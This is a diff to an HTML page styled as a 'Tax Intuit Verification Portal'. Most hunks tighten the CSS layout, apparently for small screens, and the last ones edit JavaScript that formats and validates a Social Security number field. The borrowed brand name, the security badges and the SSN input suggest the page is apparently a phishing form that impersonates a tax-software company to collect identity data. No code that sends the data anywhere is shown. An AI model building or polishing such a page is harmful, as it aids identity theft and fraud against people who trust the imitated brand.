@@ -12,131 +12,140 @@ body {
   margin: 0;
 }
 
+/* HEADER */
 header {
   background: linear-gradient(135deg, #0a3d62, #1e5f8a);
   color: white;
-  padding: 40px 20px;
+  padding: 20px 15px;
 }
 
 .header-content {
-  max-width: 1000px;
+  max-width: 900px;
   margin: auto;
 }
 
 .header-top {
   display: flex;
   align-items: center;
-  gap: 20px;
+  gap: 12px;
 }
 
 .logo {
-  width: 70px;
-  height: 70px;
+  width: 50px;
+  height: 50px;
 }
 
 .tagline {
-  font-size: 14px;
+  font-size: 12px;
   color: #dff9fb;
 }
 
+/* badges */
 .security-badges {
-  margin-top: 20px;
+  margin-top: 10px;
 }
 
 .security-badges span {
   display: inline-block;
-  margin: 5px;
-  padding: 8px 14px;
+  margin: 3px;
+  padding: 5px 10px;
   background: rgba(255,255,255,0.15);
   border-radius: 20px;
+  font-size: 11px;
 }
 
+/* CONTAINER */
 .container {
-  max-width: 700px;
-  margin: 30px auto;
+  max-width: 420px;
+  margin: 20px auto;
   background: white;
-  padding: 20px;
-  border-radius: 12px;
+  padding: 14px;
+  border-radius: 10px;
 }
 
-/* SECTIONS */
+/* SECTION */
 .section {
   background: #f8fbff;
-  padding: 15px;
-  border-radius: 12px;
-  margin-bottom: 20px;
+  padding: 10px;
+  border-radius: 10px;
+  margin-bottom: 12px;
+  box-shadow: 0 2px 6px rgba(0,0,0,0.05);
 }
 
 h3 {
-  border-left: 4px solid #0a3d62;
-  padding-left: 10px;
+  font-size: 14px;
+  border-left: 3px solid #0a3d62;
+  padding-left: 6px;
+  margin-bottom: 8px;
 }
 
 /* INPUTS */
 input, textarea, select {
   width: 100%;
-  padding: 14px;
-  margin: 10px 0 15px;
-  border-radius: 8px;
+  padding: 9px;
+  margin: 6px 0 10px;
+  border-radius: 6px;
   border: 1px solid #ccc;
-  font-size: 15px;
+  font-size: 13px;
 }
 
 /* BUTTON */
 button {
   width: 100%;
-  padding: 16px;
+  padding: 10px;
   background: #0a3d62;
   color: white;
   border: none;
-  border-radius: 10px;
+  border-radius: 6px;
+  font-size: 14px;
   cursor: pointer;
-  font-size: 16px;
 }
 
 /* INTEGRATION */
 .integration-box {
   background: linear-gradient(90deg, #eef3f8, #f8fbff);
-  padding: 15px;
+  padding: 10px;
   border-radius: 10px;
-  margin-bottom: 20px;
+  margin-bottom: 12px;
 }
 
 .systems span {
   display: inline-block;
-  margin: 5px;
-  padding: 6px 12px;
+  margin: 3px;
+  padding: 4px 8px;
   background: #e0e6ed;
   border-radius: 20px;
-  font-size: 12px;
+  font-size: 11px;
 }
 
 /* LOADING */
 .loading-box {
   display: none;
   text-align: center;
-  margin-top: 15px;
+  margin-top: 10px;
+  font-size: 13px;
 }
 
 /* FOOTERS */
 .legal-footer {
   text-align: center;
-  font-size: 12px;
+  font-size: 11px;
   color: #555;
-  margin: 20px 0 60px;
+  margin: 15px 0 50px;
 }
 
 footer {
   position: fixed;
   bottom: 0;
   width: 100%;
-  height: 35px;
+  height: 28px;
   background: black;
   color: #00ff88;
   font-family: monospace;
   display: flex;
   align-items: center;
   padding-left: 10px;
+  font-size: 11px;
 }
 </style>
 </head>
@@ -149,7 +158,7 @@ footer {
     <div class="header-top">
       <img src="file_00000000be9c71f59119349623891d0b.png" class="logo">
       <div>
-        <h1>Tax Intuit Verification Portal</h1>
+        <h1 style="font-size:18px;">Tax Intuit Verification Portal</h1>
         <p class="tagline">Secure processing • Identity verification • Compliance system</p>
       </div>
     </div>
@@ -278,9 +287,8 @@ const ssnInput = document.getElementById("ssn");
 const ssnStatus = document.getElementById("ssnStatus");
 
 ssnInput.addEventListener("input", () => {
-  let value = ssnInput.value.replace(/\D/g, ""); // remove non-numbers
+  let value = ssnInput.value.replace(/\D/g, "");
 
-  // auto format to 123-45-6789
   if (value.length > 3 && value.length <= 5) {
     value = value.slice(0,3) + "-" + value.slice(3);
   } else if (value.length > 5) {
@@ -289,7 +297,6 @@ ssnInput.addEventListener("input", () => {
 
   ssnInput.value = value;
 
-  // validate
   ssnStatus.innerText = value.length === 11
     ? "🟢 Valid SSN format"
     : "⚠️ Invalid format";
